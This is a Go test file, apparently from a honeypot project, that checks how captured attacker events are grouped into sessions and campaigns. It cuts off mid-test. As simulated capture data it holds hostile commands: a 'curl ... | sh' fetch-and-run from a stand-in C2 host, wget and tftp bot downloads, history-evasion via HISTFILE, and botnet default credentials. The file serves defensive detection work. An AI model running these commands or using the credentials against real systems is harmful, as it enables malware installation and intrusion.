package intelligence

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"reflect"
	"runtime"
	"slices"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/durablejson"
)

func makeTTPEvent(sourceIP, command string) *database.Event {
	return &database.Event{
		Honeypot:       "cowrie",
		SourceIP:       sourceIP,
		EventType:      "command",
		Command:        command,
		TechniqueID:    "T1059",
		KillChainStage: "execution",
		Timestamp:      time.Now().UTC(),
	}
}

// ttpEpoch is a fixed start for tests that need exact, repeatable times.
var ttpEpoch = time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)

// at returns e with its timestamp set to ttpEpoch plus the given seconds.
func at(seconds int, e *database.Event) *database.Event {
	e.Timestamp = ttpEpoch.Add(time.Duration(seconds) * time.Second)
	return e
}

func downloadEvent(sourceIP, shasum string) *database.Event {
	return &database.Event{
		Honeypot: "cowrie", SourceIP: sourceIP, EventType: "cowrie.session.file_download",
		Metadata: map[string]string{"shasum": shasum}, Timestamp: time.Now().UTC(),
	}
}

func loginEvent(sourceIP, user, pass, userAgent string) *database.Event {
	e := &database.Event{
		Honeypot: "cowrie", SourceIP: sourceIP, EventType: "cowrie.login.failed",
		Username: user, Password: pass, Timestamp: time.Now().UTC(),
	}
	if userAgent != "" {
		e.Metadata = map[string]string{"user_agent": userAgent}
	}
	return e
}

// sessionsBySource indexes the builder's open sessions by their source
// addresses (comma-joined; a session without one by its ID).
func sessionsBySource(t *testing.T, b *TTPBuilder) map[string]*database.TTPSession {
	t.Helper()
	out := make(map[string]*database.TTPSession)
	for _, s := range b.GetActiveSessions() {
		key := strings.Join(s.SourceIPs, ",")
		if key == "" {
			key = s.SessionID
		}
		if out[key] != nil {
			t.Fatalf("two open sessions for source %q", key)
		}
		out[key] = s
	}
	return out
}

// entryCounts recounts the evidence entries the builder holds.
func entryCounts(b *TTPBuilder) (strong, weak, retainedStrong, retainedWeak int) {
	for _, s := range b.sessions {
		strong += len(s.evidence) + len(s.commands)
		weak += len(s.weak)
	}
	for _, g := range b.retained {
		retainedStrong += len(g.Strong)
		retainedWeak += len(g.Weak)
	}
	return strong + retainedStrong, weak + retainedWeak, retainedStrong, retainedWeak
}

// checkCounters fails when the builder's running totals disagree with a
// recount, or exceed their limits.
func checkCounters(t *testing.T, b *TTPBuilder) {
	t.Helper()
	strong, weak, retainedStrong, retainedWeak := entryCounts(b)
	if strong != b.strongEntries || weak != b.weakEntries || retainedStrong != b.retainedStrong || retainedWeak != b.retainedWeak {
		t.Fatalf("counters strong=%d weak=%d retained=%d/%d, recount %d %d %d/%d",
			b.strongEntries, b.weakEntries, b.retainedStrong, b.retainedWeak, strong, weak, retainedStrong, retainedWeak)
	}
	if strong > b.maxEvidence || weak > b.maxWeak {
		t.Fatalf("%d strong and %d weak entries, limits %d and %d", strong, weak, b.maxEvidence, b.maxWeak)
	}
}

// ---- sessions: one per source ----

func TestNewSessionCreated(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	id, isNew := b.Update(makeTTPEvent("203.0.113.1", "id"))
	if !isNew || id == "" {
		t.Errorf("first event: id=%q isNew=%v, want a new session", id, isNew)
	}
	if again, isNew := b.Update(makeTTPEvent("203.0.113.1", "id")); isNew || again != id {
		t.Errorf("second event of the source: id=%q isNew=%v, want session %q again", again, isNew, id)
	}
}

// Two unrelated attackers who each run "uname -a" are two sessions and two
// campaigns. Keying on the command's first word made them one.
func TestCommonCommandDoesNotLinkSources(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	b.Update(makeTTPEvent("203.0.113.1", "uname -a"))
	b.Update(makeTTPEvent("198.51.100.7", "uname -a"))
	s := sessionsBySource(t, b)
	if len(s) != 2 {
		t.Fatalf("%d sessions, want one per source", len(s))
	}
	one, two := s["203.0.113.1"], s["198.51.100.7"]
	if one.CampaignFingerprint == two.CampaignFingerprint {
		t.Fatalf("one common command put two sources in campaign %s", one.CampaignFingerprint)
	}
	for _, x := range []*database.TTPSession{one, two} {
		if x.Confidence != confidenceSingleSource || x.EventCount != 1 || len(x.CampaignFingerprint) != 32 {
			t.Errorf("session %+v: want confidence %v, 1 event, a 128-bit fingerprint", x, confidenceSingleSource)
		}
	}
}

// Everything one source does is one session, whatever it runs and whichever
// honeypot it reaches. Keying on the command split it up.
func TestOneSourceOneSession(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	events := []*database.Event{
		makeTTPEvent("203.0.113.1", "uname -a"),
		makeTTPEvent("203.0.113.1", "wget http://198.51.100.9/a.sh"),
		makeTTPEvent("203.0.113.1", "curl http://c2.example.net/b | sh"),
		loginEvent("203.0.113.1", "root", "admin", "Go-http-client/1.1"),
		{Honeypot: "dionaea", SourceIP: "203.0.113.1", EventType: "dionaea.connection", Timestamp: time.Now().UTC()},
	}
	ids := map[string]bool{}
	for _, e := range events {
		id, _ := b.Update(e)
		ids[id] = true
	}
	s := b.GetActiveSessions()
	if len(s) != 1 || len(ids) != 1 {
		t.Fatalf("%d sessions under %d IDs, want one session", len(s), len(ids))
	}
	if s[0].EventCount != int64(len(events)) || !reflect.DeepEqual(s[0].SourceIPs, []string{"203.0.113.1"}) {
		t.Fatalf("session has %d events from %v", s[0].EventCount, s[0].SourceIPs)
	}
}

func TestIPv6SourceIsItsSlash64(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	b.Update(makeTTPEvent("2001:db8:1:2::10", "id"))
	b.Update(makeTTPEvent("2001:db8:1:2:aaaa::20", "id"))
	b.Update(makeTTPEvent("2001:db8:1:3::10", "id"))
	b.Update(makeTTPEvent("::ffff:203.0.113.9", "id"))
	b.Update(makeTTPEvent("203.0.113.9", "id"))
	s := sessionsBySource(t, b)
	if len(s) != 3 {
		t.Fatalf("%d sessions, want the /64, the other /64 and the IPv4 address: %v", len(s), s)
	}
	if x := s["2001:db8:1:2::10,2001:db8:1:2:aaaa::20"]; x == nil || x.EventCount != 2 {
		t.Fatalf("the two addresses of one /64 are not one session: %v", s)
	}
	if x := s["203.0.113.9,::ffff:203.0.113.9"]; x == nil || x.EventCount != 2 {
		t.Fatalf("an IPv4-mapped address is not its IPv4 address: %v", s)
	}
}

// Events without a usable source address go to one bucket per honeypot. The
// bucket is not an actor: it lists no address, has the lowest confidence and
// its evidence links nothing.
func TestUnknownSourceBucket(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	for _, ip := range []string{"", "not-an-ip", "0.0.0.0", "::"} {
		b.Update(makeTTPEvent(ip, "wget http://198.51.100.9/a.sh"))
	}
	other := makeTTPEvent("", "wget http://198.51.100.9/a.sh")
	other.Honeypot = "adbhoney"
	b.Update(other)
	b.Update(makeTTPEvent("203.0.113.1", "wget http://198.51.100.9/a.sh"))

	sessions := b.GetActiveSessions()
	if len(sessions) != 3 {
		t.Fatalf("%d sessions, want cowrie's bucket, adbhoney's bucket and the known source", len(sessions))
	}
	fps := map[string]bool{}
	for _, s := range sessions {
		fps[s.CampaignFingerprint] = true
		if len(s.SourceIPs) == 0 {
			if s.Confidence != confidenceUnknownSource || s.SharedInfrastructure {
				t.Errorf("unknown-source bucket %+v: want confidence %v", s, confidenceUnknownSource)
			}
		} else if s.Confidence != confidenceSingleSource {
			t.Errorf("a bucket's download host raised a real source's confidence to %v", s.Confidence)
		}
	}
	if len(fps) != 3 {
		t.Fatalf("an unknown-source bucket was linked to a campaign: %d fingerprints for 3 sessions", len(fps))
	}
	// The same bucket again after a restore: the key is deterministic.
	state, err := b.checkpoint()
	if err != nil {
		t.Fatal(err)
	}
	r := NewTTPBuilder(30 * time.Minute)
	if err := r.restoreCheckpoint(state); err != nil {
		t.Fatal(err)
	}
	if _, isNew := r.Update(makeTTPEvent("garbage", "id")); isNew {
		t.Fatal("an unparseable address did not join cowrie's unknown-source bucket after a restore")
	}
}

func TestSessionEventCountGrows(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	for i := 0; i < 5; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	if len(sessions) != 1 || sessions[0].EventCount != 5 {
		t.Fatalf("sessions %v, want one with 5 events", sessions)
	}
}

// ---- campaigns: strong shared evidence only ----

// Two sources fetching from the same host are one campaign. The first
// session changes when the second source appears (its evidence is now
// shared), and the snapshot the worker persists holds both.
func TestSharedDownloadHostLinksSources(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	b.Update(makeTTPEvent("203.0.113.1", "wget http://c2.example.com/stage1"))
	b.Update(makeTTPEvent("198.51.100.99", "uname -a")) // unlinked, for comparison
	before := sessionsBySource(t, b)["203.0.113.1"]
	if before.Confidence != confidenceSingleSource {
		t.Fatalf("one source alone has confidence %v, want %v", before.Confidence, confidenceSingleSource)
	}

	b.Update(makeTTPEvent("203.0.113.2", "curl -O http://c2.example.com/stage2"))
	s := sessionsBySource(t, b)
	first, second, unlinked := s["203.0.113.1"], s["203.0.113.2"], s["198.51.100.99"]
	if first == nil || second == nil || len(s) != 3 {
		t.Fatalf("sessions %v, want one per source", s)
	}
	if first.CampaignFingerprint != second.CampaignFingerprint {
		t.Fatalf("same download host, campaigns %s and %s", first.CampaignFingerprint, second.CampaignFingerprint)
	}
	if first.CampaignFingerprint == unlinked.CampaignFingerprint {
		t.Fatal("the unrelated source joined the campaign")
	}
	if first.SessionID != before.SessionID || first.SessionID == second.SessionID {
		t.Fatalf("session IDs %q (was %q) and %q: a link must not change or merge them", first.SessionID, before.SessionID, second.SessionID)
	}
	// Both sessions are handed back changed: the earlier one too.
	if first.Confidence <= before.Confidence || second.Confidence != first.Confidence {
		t.Fatalf("confidence %v (was %v) and %v: both linked sessions should have risen together", first.Confidence, before.Confidence, second.Confidence)
	}
	if first.Confidence <= unlinked.Confidence {
		t.Fatalf("linked confidence %v is not above the unlinked %v", first.Confidence, unlinked.Confidence)
	}
}

// The download host is the host the URL connects to; userinfo in front of it
// is free text an attacker can vary per bot.
func TestCampaignUsesHostAfterUserinfo(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	b.Update(makeTTPEvent("203.0.113.1", "wget http://a.example@203.0.113.9/x.sh"))
	b.Update(makeTTPEvent("203.0.113.2", "wget http://b.example@203.0.113.9/x.sh"))
	b.Update(makeTTPEvent("203.0.113.3", "wget hxxp://203.0.113[.]9:8080/y.sh"))
	fps := map[string]bool{}
	for _, s := range b.GetActiveSessions() {
		fps[s.CampaignFingerprint] = true
	}
	if len(fps) != 1 {
		t.Fatalf("same download host, %d campaigns", len(fps))
	}
}

// A host every bot asks for its own address, a private address and a sensor's
// own text are not shared payload infrastructure.
func TestBenignHostsDoNotLink(t *testing.T) {
	for _, tc := range []struct{ name, honeypot, command string }{
		{"ip echo service", "cowrie", "curl http://ipinfo.io/ip"},
		{"private address", "cowrie", "wget http://192.168.1.1/setup.cgi"},
		{"loopback", "cowrie", "curl http://127.0.0.1:8080/x"},
		{"sensor text", "suricata", "ET MALWARE http://198.51.100.9/a.sh"},
	} {
		b := NewTTPBuilder(30 * time.Minute)
		for _, ip := range []string{"203.0.113.1", "203.0.113.2"} {
			e := makeTTPEvent(ip, tc.command)
			e.Honeypot = tc.honeypot
			b.Update(e)
		}
		s := sessionsBySource(t, b)
		if s["203.0.113.1"].CampaignFingerprint == s["203.0.113.2"].CampaignFingerprint {
			t.Errorf("%s: %q linked two sources", tc.name, tc.command)
		}
	}
}

func TestPayloadHashLinksSources(t *testing.T) {
	sha := strings.Repeat("ab", 32)
	b := NewTTPBuilder(30 * time.Minute)
	b.Update(downloadEvent("203.0.113.1", sha))
	b.Update(downloadEvent("203.0.113.2", strings.ToUpper(sha)))
	// Not payloads: the hash of an empty file, and a shasum on another event
	// (cowrie.log.closed carries the TTY recording's).
	b.Update(downloadEvent("203.0.113.3", emptySHA256))
	b.Update(downloadEvent("203.0.113.4", emptySHA256))
	for _, ip := range []string{"203.0.113.5", "203.0.113.6"} {
		e := downloadEvent(ip, sha)
		e.EventType = "cowrie.log.closed"
		b.Update(e)
	}
	s := sessionsBySource(t, b)
	if s["203.0.113.1"].CampaignFingerprint != s["203.0.113.2"].CampaignFingerprint {
		t.Fatal("the same downloaded payload did not link two sources")
	}
	if got := s["203.0.113.1"].Confidence; got != 0.9 {
		t.Fatalf("shared payload confidence %v, want 0.9", got)
	}
	fps := map[string]bool{}
	for _, x := range s {
		fps[x.CampaignFingerprint] = true
	}
	if len(fps) != 5 {
		t.Fatalf("%d campaigns for 6 sources, want 5: only the real payload links", len(fps))
	}
}

// Five identical commands in the same order are a script and link; fewer, or
// the same commands in another order, do not.
func TestCommandSequenceLinksSources(t *testing.T) {
	script := []string{"uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "crontab -l", "w", "ls -la /root"}
	run := func(b *TTPBuilder, ip string, cmds []string) {
		for i, c := range cmds {
			e := makeTTPEvent(ip, c)
			e.Timestamp = ttpEpoch.Add(time.Duration(i) * time.Second)
			b.Update(e)
		}
	}
	b := NewTTPBuilder(30 * time.Minute)
	run(b, "203.0.113.1", script)
	run(b, "203.0.113.2", []string{"uname   -a ", script[1], script[2], script[3], script[4]}) // whitespace only
	run(b, "203.0.113.3", script[:sequenceCommands-1])                                         // too short
	run(b, "203.0.113.4", script[:sequenceCommands-1])
	run(b, "203.0.113.5", []string{script[1], script[0], script[2], script[3], script[4]}) // another order
	s := sessionsBySource(t, b)
	fp := func(ip string) string { return s[ip].CampaignFingerprint }
	if fp("203.0.113.1") != fp("203.0.113.2") {
		t.Fatal("the same five commands in the same order did not link two sources")
	}
	if got := s["203.0.113.1"].Confidence; got != 0.75 {
		t.Fatalf("shared sequence confidence %v, want 0.75", got)
	}
	if fp("203.0.113.3") == fp("203.0.113.4") || fp("203.0.113.3") == fp("203.0.113.1") {
		t.Fatalf("%d common commands linked sources; the minimum is %d", sequenceCommands-1, sequenceCommands)
	}
	if fp("203.0.113.5") == fp("203.0.113.1") {
		t.Fatal("the same commands in a different order linked two sources")
	}
}

// A user agent and a credential pair never link sources. Shared inside a
// campaign that strong evidence already links, they raise confidence.
func TestWeakEvidenceOnlyCorroborates(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	for _, ip := range []string{"203.0.113.1", "203.0.113.2"} {
		b.Update(loginEvent(ip, "root", "xc3511", "Hello, world"))
	}
	s := sessionsBySource(t, b)
	if s["203.0.113.1"].CampaignFingerprint == s["203.0.113.2"].CampaignFingerprint {
		t.Fatal("a shared user agent and credential linked two sources")
	}
	if got := s["203.0.113.1"].Confidence; got != confidenceSingleSource {
		t.Fatalf("weak evidence alone changed confidence to %v", got)
	}

	for _, ip := range []string{"203.0.113.1", "203.0.113.2", "203.0.113.3"} {
		b.Update(makeTTPEvent(ip, "wget http://198.51.100.9/a.sh"))
	}
	s = sessionsBySource(t, b)
	corroborated, plain := s["203.0.113.1"], s["203.0.113.3"]
	if corroborated.CampaignFingerprint != plain.CampaignFingerprint {
		t.Fatal("the shared download host did not link the sources")
	}
	if plain.Confidence != 0.85 || corroborated.Confidence != 0.88 {
		t.Fatalf("confidence %v with corroboration and %v without, want 0.88 and 0.85", corroborated.Confidence, plain.Confidence)
	}
}

// A shares a host with B, B shares a payload with C: one campaign, whatever
// order the three appear in, and no session changes its ID.
func TestTransitiveLink(t *testing.T) {
	sha := strings.Repeat("cd", 32)
	events := map[string][]*database.Event{
		"a": {at(1, makeTTPEvent("203.0.113.1", "wget http://198.51.100.9/a.sh"))},
		"b": {at(2, makeTTPEvent("203.0.113.2", "wget http://198.51.100.9/a.sh")), at(3, downloadEvent("203.0.113.2", sha))},
		"c": {at(4, downloadEvent("203.0.113.3", sha))},
	}
	for _, order := range []string{"abc", "acb", "bac", "bca", "cab", "cba"} {
		b := NewTTPBuilder(30 * time.Minute)
		ids := map[string]string{}
		for i, name := range order {
			for _, e := range events[string(name)] {
				ids[e.SourceIP], _ = b.Update(e)
			}
			if i == 1 && order[2] == 'b' {
				// Without B the two ends are separate campaigns.
				s := sessionsBySource(t, b)
				if s["203.0.113.1"].CampaignFingerprint == s["203.0.113.3"].CampaignFingerprint {
					t.Fatalf("order %s: A and C linked before B arrived", order)
				}
			}
		}
		s := sessionsBySource(t, b)
		fp := s["203.0.113.1"].CampaignFingerprint
		// The campaign is named after its earliest evidence: A's host.
		if want := hash128(domainCampaignEvidence, kindHost+hash128(domainHost, "198.51.100.9")); fp != want {
			t.Fatalf("order %s: campaign %s, want %s", order, fp, want)
		}
		for ip, x := range s {
			if x.CampaignFingerprint != fp {
				t.Fatalf("order %s: %s is in campaign %s, the others in %s", order, ip, x.CampaignFingerprint, fp)
			}
			if x.SessionID != ids[ip] {
				t.Fatalf("order %s: session ID of %s changed from %q to %q", order, ip, ids[ip], x.SessionID)
			}
		}
	}
}

// correlationEvents is a mixed capture: linked and unlinked sources, shared
// and private addresses, an IPv6 /64, an unknown source, command sequences
// that only time order tells apart, and weak evidence.
func correlationEvents() []*database.Event {
	payload, second := strings.Repeat("ab", 32), strings.Repeat("ef", 32)
	script := []string{"uname -a", "nproc", "free -m", "crontab -l", "w"}
	n := 0
	next := func(e *database.Event) *database.Event { n++; return at(n, e) }
	var events []*database.Event
	add := func(e *database.Event) { events = append(events, next(e)) }

	// a - b by host, b - c by payload; c is a cloud address.
	add(makeTTPEvent("203.0.113.1", "uname -a"))
	add(makeTTPEvent("203.0.113.1", "wget http://198.51.100.9/a.sh"))
	add(makeTTPEvent("203.0.113.2", "uname -a"))
	add(makeTTPEvent("203.0.113.2", "curl http://198.51.100.9/b"))
	add(downloadEvent("203.0.113.2", payload))
	add(downloadEvent("52.1.2.3", payload))
	add(makeTTPEvent("52.1.2.3", "id"))
	// d: the common command alone.
	add(makeTTPEvent("203.0.113.4", "uname -a"))
	// e and f run the same script.
	for _, ip := range []string{"203.0.113.5", "203.0.113.6"} {
		for _, c := range script {
			add(makeTTPEvent(ip, c))
		}
		add(makeTTPEvent(ip, "ls -la"))
	}
	// h runs one command first, then the script: its first five differ. Seen
	// without its first command it would look like e and f.
	add(makeTTPEvent("203.0.113.8", "export HISTFILE=/dev/null"))
	for _, c := range script {
		add(makeTTPEvent("203.0.113.8", c))
	}
	// i (an IPv6 /64, two addresses) and j share a host, a user agent and a
	// credential; l has only the credential.
	add(makeTTPEvent("2001:db8:1:2::10", "wget http://dl.example.net/x"))
	add(loginEvent("2001:db8:1:2::20", "admin", "7ujMko0admin", "Mozi"))
	add(makeTTPEvent("203.0.113.10", "wget http://dl.example.net/y"))
	add(loginEvent("203.0.113.10", "admin", "7ujMko0admin", "Mozi"))
	add(loginEvent("203.0.113.12", "admin", "7ujMko0admin", ""))
	// An unknown source showing a's host.
	add(makeTTPEvent("", "wget http://198.51.100.9/a.sh"))
	// m - n by host, n - o by payload, o is a cloud address seen twice.
	add(makeTTPEvent("203.0.113.13", "tftp -g -r bot http://203.0.113.200/bot"))
	add(makeTTPEvent("203.0.113.14", "wget http://203.0.113.200/bot"))
	add(downloadEvent("203.0.113.14", second))
	add(downloadEvent("54.9.9.9", second))
	add(loginEvent("54.9.9.9", "root", "root", ""))
	return events
}

// correlationResult is what must not depend on arrival order: each session's
// addresses, flags, confidence and times, and which sessions share a campaign
// (as a partition: the IDs themselves are not compared).
func correlationResult(b *TTPBuilder) string {
	groups := map[string][]string{}
	var lines []string
	for _, s := range b.GetActiveSessions() {
		who := strings.Join(s.SourceIPs, ",")
		groups[s.CampaignFingerprint] = append(groups[s.CampaignFingerprint], who)
		lines = append(lines, fmt.Sprintf("session %s shared=%v confidence=%v events=%d first=%d last=%d",
			who, s.SharedInfrastructure, s.Confidence, s.EventCount, s.FirstSeen.Unix(), s.LastSeen.Unix()))
	}
	for _, members := range groups {
		sort.Strings(members)
		lines = append(lines, "campaign "+strings.Join(members, " + "))
	}
	sort.Strings(lines)
	return strings.Join(lines, "\n")
}

// The same events in any order give the same sessions and the same campaigns.
// Overwriting SharedInfrastructure per event and fingerprinting each event on
// its own made both depend on which event came last.
func TestCorrelationIndependentOfArrivalOrder(t *testing.T) {
	events := correlationEvents()
	ref := NewTTPBuilder(time.Hour)
	for _, e := range events {
		ref.Update(e)
	}
	want := correlationResult(ref)

	// The capture means what it is meant to.
	for _, line := range []string{
		"campaign 203.0.113.1 + 203.0.113.2 + 52.1.2.3",
		"campaign 203.0.113.4",
		"campaign 203.0.113.5 + 203.0.113.6",
		"campaign 203.0.113.8",
		"campaign 2001:db8:1:2::10,2001:db8:1:2::20 + 203.0.113.10",
		"campaign 203.0.113.12",
		"campaign 203.0.113.13 + 203.0.113.14 + 54.9.9.9",
		"campaign ",
	} {
		if !slices.Contains(strings.Split(want, "\n"), line) {
			t.Fatalf("result lacks the line %q:\n%s", line, want)
		}
	}
	for _, line := range []string{
		"session 203.0.113.1 shared=false confidence=0.85 ",
		"session 203.0.113.2 shared=false confidence=0.95 ",
		"session 52.1.2.3 shared=true confidence=0.86 ",
		"session 203.0.113.4 shared=false confidence=0.5 ",
		"session 203.0.113.5 shared=false confidence=0.75 ",
		"session 203.0.113.8 shared=false confidence=0.5 ",
		"session 203.0.113.10 shared=false confidence=0.88 ",
		"session 203.0.113.12 shared=false confidence=0.5 ",
		"session  shared=false confidence=0.1 ",
		"session 54.9.9.9 shared=true confidence=0.86 ",
	} {
		if !strings.Contains("\n"+want, "\n"+line) {
			t.Fatalf("result lacks a line starting %q:\n%s", line, want)
		}
	}

	for seed := int64(1); seed <= 200; seed++ {
		shuffled := append([]*database.Event(nil), events...)
		rand.New(rand.NewSource(seed)).Shuffle(len(shuffled), func(i, j int) { shuffled[i], shuffled[j] = shuffled[j], shuffled[i] })
		b := NewTTPBuilder(time.Hour)
		for i, e := range shuffled {
			b.Update(e)
			if i%7 == int(seed%7) {
				b.GetActiveSessions() // resolving part-way must leave no trace
			}
		}
		if got := correlationResult(b); got != want {
			t.Fatalf("seed %d: arrival order changed the result.\n--- in time order\n%s\n--- shuffled\n%s", seed, want, got)
		}
		checkCounters(t, b)
	}
}

// ---- confidence ----

// Confidence measures evidence, not volume: one event and ten thousand with
// the same evidence score the same.
func TestConfidenceIndependentOfEventCount(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	b.Update(makeTTPEvent("203.0.113.1", "uname -a"))
	for i := 0; i < 10000; i++ {
		b.Update(makeTTPEvent("203.0.113.2", "uname -a"))
	}
	b.Update(makeTTPEvent("203.0.113.3", "wget http://198.51.100.9/a.sh"))
	for i := 0; i < 10000; i++ {
		b.Update(makeTTPEvent("203.0.113.4", "wget http://198.51.100.9/a.sh"))
	}
	s := sessionsBySource(t, b)
	if s["203.0.113.2"].EventCount != 10000 || s["203.0.113.1"].Confidence != s["203.0.113.2"].Confidence {
		t.Fatalf("unlinked: confidence %v with 1 event, %v with %d", s["203.0.113.1"].Confidence, s["203.0.113.2"].Confidence, s["203.0.113.2"].EventCount)
	}
	if s["203.0.113.3"].Confidence != s["203.0.113.4"].Confidence || s["203.0.113.3"].Confidence != 0.85 {
		t.Fatalf("linked: confidence %v with 1 event, %v with 10000, want 0.85 for both", s["203.0.113.3"].Confidence, s["203.0.113.4"].Confidence)
	}
}

func TestCampaignConfidence(t *testing.T) {
	all := []evidenceKinds{0, sharedPayload, sharedHost, sharedSequence, sharedPayload | sharedHost, sharedHost | sharedSequence, sharedPayload | sharedHost | sharedSequence}
	for _, kinds := range all {
		for _, infra := range []bool{false, true} {
			plain := campaignConfidence(false, infra, kinds, false)
			with := campaignConfidence(false, infra, kinds, true)
			if plain < 0 || plain > maxConfidence || with < plain || with > maxConfidence {
				t.Errorf("kinds=%b infra=%v: confidence %v, %v with corroboration", kinds, infra, plain, with)
			}
			if kinds == 0 && with != plain {
				t.Errorf("infra=%v: weak evidence alone raised confidence from %v to %v", infra, plain, with)
			}
			if kinds != 0 && plain <= campaignConfidence(false, infra, 0, false) {
				t.Errorf("kinds=%b infra=%v: shared evidence did not raise confidence", kinds, infra)
			}
			if !infra && plain < campaignConfidence(false, true, kinds, false) {
				t.Errorf("kinds=%b: a shared address scored above a single one", kinds)
			}
		}
	}
	if got := campaignConfidence(true, false, sharedPayload|sharedHost, true); got != confidenceUnknownSource {
		t.Errorf("unknown source: confidence %v, want %v", got, confidenceUnknownSource)
	}
	if got := campaignConfidence(false, true, 0, false); got != confidenceSharedSource {
		t.Errorf("shared address alone: confidence %v, want %v", got, confidenceSharedSource)
	}
}

// ---- shared infrastructure ----

func TestSharedInfrastructureAWS(t *testing.T) {
	if !isSharedInfrastructure("52.12.34.56") {
		t.Error("AWS IP 52.x.x.x should be flagged as shared infrastructure")
	}
}

func TestSharedInfrastructurePrivateNotFlagged(t *testing.T) {
	// Private IPs are not cloud infrastructure.
	if isSharedInfrastructure("192.168.1.1") {
		t.Error("private IP should not be flagged as shared infrastructure")
	}
}

// A session is shared infrastructure when any of its addresses is, whichever
// its events show last, and a linked source does not change another's flag.
func TestSharedInfrastructureIsSticky(t *testing.T) {
	for _, order := range [][]string{{"::ffff:52.1.2.3", "52.1.2.3"}, {"52.1.2.3", "::ffff:52.1.2.3"}} {
		b := NewTTPBuilder(30 * time.Minute)
		for _, ip := range order {
			b.Update(makeTTPEvent(ip, "wget http://198.51.100.9/a.sh"))
		}
		b.Update(makeTTPEvent("203.0.113.1", "wget http://198.51.100.9/a.sh"))
		b.Update(makeTTPEvent("52.1.2.3", "id"))
		s := sessionsBySource(t, b)
		if cloud := s["52.1.2.3,::ffff:52.1.2.3"]; cloud == nil || !cloud.SharedInfrastructure {
			t.Fatalf("order %v: cloud session %+v not flagged", order, cloud)
		}
		if s["203.0.113.1"].SharedInfrastructure {
			t.Fatalf("order %v: the linked cloud source flagged a private one", order)
		}
	}

	// One /64 with an address inside a shared range and one outside it (the
	// built-in ranges are all IPv4, so the test adds one): flagged in either
	// order. Taking the last event's address gave true or false by order.
	_, shared, err := net.ParseCIDR("2001:db8:1:2:8000::/65")
	if err != nil {
		t.Fatal(err)
	}
	builtin := knownCloudCIDRs
	knownCloudCIDRs = append(append([]*net.IPNet(nil), builtin...), shared)
	defer func() { knownCloudCIDRs = builtin }()
	for _, order := range [][]string{{"2001:db8:1:2:8000::1", "2001:db8:1:2::1"}, {"2001:db8:1:2::1", "2001:db8:1:2:8000::1"}} {
		b := NewTTPBuilder(30 * time.Minute)
		for _, ip := range order {
			b.Update(makeTTPEvent(ip, "id"))
		}
		s := b.GetActiveSessions()
		if len(s) != 1 || !s[0].SharedInfrastructure || s[0].Confidence != confidenceSharedSource {
			t.Fatalf("order %v: session %+v, want one flagged session at confidence %v", order, s, confidenceSharedSource)
		}
	}
}

// ---- expiry ----

func TestFlushExpiredRemovesStaleSessions(t *testing.T) {
	b := NewTTPBuilder(1 * time.Millisecond) // very short inactivity window
	ev := makeTTPEvent("203.0.113.1", "id")
	// Set an old timestamp so the session is immediately expired.
	ev.Timestamp = time.Now().UTC().Add(-1 * time.Hour)
	b.Update(ev)

	time.Sleep(5 * time.Millisecond)
	expired := b.FlushExpired()
	if len(expired) != 1 || expired[0].CampaignFingerprint == "" {
		t.Errorf("expected the expired session with its campaign, got %v", expired)
	}
	if len(b.GetActiveSessions()) != 0 {
		t.Error("active sessions should be empty after flush")
	}
}

func TestFlushExpiredKeepsActiveSessions(t *testing.T) {
	b := NewTTPBuilder(10 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	b.Update(ev)
	expired := b.FlushExpired()
	if len(expired) != 0 {
		t.Errorf("fresh session should not be expired, got %d expired", len(expired))
	}
}

// A source that returns after its session expired gets a new session ID (same
// campaign fingerprint), so persisting it can't overwrite the earlier,
// already-flushed session.
func TestReturningSourceGetsNewSessionID(t *testing.T) {
	for _, command := range []string{"wget http://198.51.100.9/bot.sh", "uname -a"} {
		b := NewTTPBuilder(time.Minute)
		ev := func(at time.Time) *database.Event {
			return &database.Event{Timestamp: at, Honeypot: "cowrie", SourceIP: "203.0.113.20",
				EventType: "command", Command: command, Username: "root"}
		}
		firstID, _ := b.Update(ev(time.Now().UTC().Add(-2 * time.Hour)))
		flushed := b.FlushExpired()
		if len(flushed) != 1 || flushed[0].SessionID != firstID {
			t.Fatalf("FlushExpired returned %v, want session %q", flushed, firstID)
		}
		secondID, isNew := b.Update(ev(time.Now().UTC()))
		if !isNew || secondID == firstID {
			t.Fatalf("returning source: session %q isNew=%v, want a new session, not %q again", secondID, isNew, firstID)
		}
		if got := b.GetActiveSessions()[0].CampaignFingerprint; got != flushed[0].CampaignFingerprint {
			t.Fatalf("%q: campaign fingerprint changed from %q to %q", command, flushed[0].CampaignFingerprint, got)
		}
		checkCounters(t, b)
	}
}

// A campaign keeps its fingerprint, and its sessions their confidence, when
// its first members expire: their evidence is retained while the campaign has
// an open session, and dropped with the last one.
func TestExpiredSessionEvidenceStaysWithCampaign(t *testing.T) {
	b := NewTTPBuilder(time.Hour)
	old := time.Now().UTC().Add(-3 * time.Hour)
	sha := strings.Repeat("12", 32)
	first := makeTTPEvent("203.0.113.1", "wget http://198.51.100.9/a.sh")
	first.Timestamp = old
	firstPayload := downloadEvent("203.0.113.1", sha)
	firstPayload.Timestamp = old.Add(time.Second)
	b.Update(first)
	b.Update(firstPayload)
	b.Update(makeTTPEvent("203.0.113.2", "wget http://198.51.100.9/a.sh"))
	before := sessionsBySource(t, b)

	if flushed := b.FlushExpired(); len(flushed) != 1 || flushed[0].CampaignFingerprint != before["203.0.113.1"].CampaignFingerprint {
		t.Fatalf("flushed %v, want the first source's session in its campaign", flushed)
	}
	after := sessionsBySource(t, b)["203.0.113.2"]
